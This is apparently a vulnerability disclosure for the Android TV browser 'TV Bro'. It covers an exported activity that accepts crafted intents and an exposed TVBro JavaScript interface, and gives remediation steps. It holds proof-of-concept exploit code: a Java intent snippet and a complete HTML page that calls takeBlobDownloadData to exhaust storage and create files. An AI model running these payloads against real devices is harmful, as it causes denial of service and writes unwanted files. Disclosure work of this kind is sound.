
---

## Vulnerability Report: `com.phlox.tvwebbrowser` 'TV Bro' Version <= 2.0.0

### Vulnerability: JavaScript Code Injection via Intent Handlers

---

#### **Summary**:
The `com.phlox.tvwebbrowser` application improperly handles external intents, potentially leading to Arbitrary Code Execution (ACE) via crafted URIs.

#### **Severity**:
🔴 High

#### **Details**:
The exposed `com.phlox.tvwebbrowser.activity.main.MainActivity` allows external applications to execute arbitrary JavaScript within its context. Specifically, a malicious app can invoke this activity with a specially crafted URI that contains JavaScript, leading to unwanted code execution.

##### Proof of Concept:

![image](https://github.com/actuator/com.phlox.tvwebbrowser/blob/main/tvwebpoc.gif)

```java
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setComponent(new ComponentName("com.phlox.tvwebbrowser", "com.phlox.tvwebbrowser.activity.main.MainActivity"));
intent.setData(Uri.parse("https://windows96.net"));
startActivity(intent);
```

#### **Common Weakness Enumeration (CWE)**:
- [CWE-94](https://cwe.mitre.org/data/definitions/94.html): Improper Control of Generation of Code ('Code Injection')

#### **Remediation Steps**:
1. **Restrict External Intent Handling**: In `AndroidManifest.xml`, ensure the `exported` attribute for the affected activity is set to `false`.
2. **URI Sanitization**: Implement a strict validation and sanitation mechanism for URIs before processing.


#### Addendum
---

The com.phlox.tvwebbrowser application exposes a JavaScript interface, namely TVBro, to its WebView component. This interface provides powerful methods that can be invoked by any web page loaded into the WebView. Such unrestricted access can lead to a variety of security risks, such as arbitrary file downloads, resource exhaustion, and potentially other undisclosed impacts.

#### Impact:

#### Resource Exhaustion:
An attacker can generate an extremely large file using the takeBlobDownloadData method which could lead to resource exhaustion and potential denial-of-service scenarios.

#### Arbitrary File Creation: 
The method allows for the creation of files with arbitrary content on the user's device without user consent.
Potential for other Exploits: Without a detailed assessment of all methods within the TVBro interface, there may be other exploitable functionalities.

#### Proof of Concept:
Below is a sample payload that exploits the vulnerability by attempting to create an extremely large file:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploit Page</title>
</head>
<body>
    <script>
        // Generate a large random base64 string 
        function generateRandomBase64String(length) {
            let characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        // Check if the JS interface method exists
        if (window.TVBro && typeof window.TVBro.takeBlobDownloadData === 'function') {
            // Send an extremely large base64 data to the method
            window.TVBro.takeBlobDownloadData(generateRandomBase64String(50005000000050000000500000005000000050000000500000000000), 'exploit.txt', 'text/plain');
        }
    </script>
</body>
</html>
```html
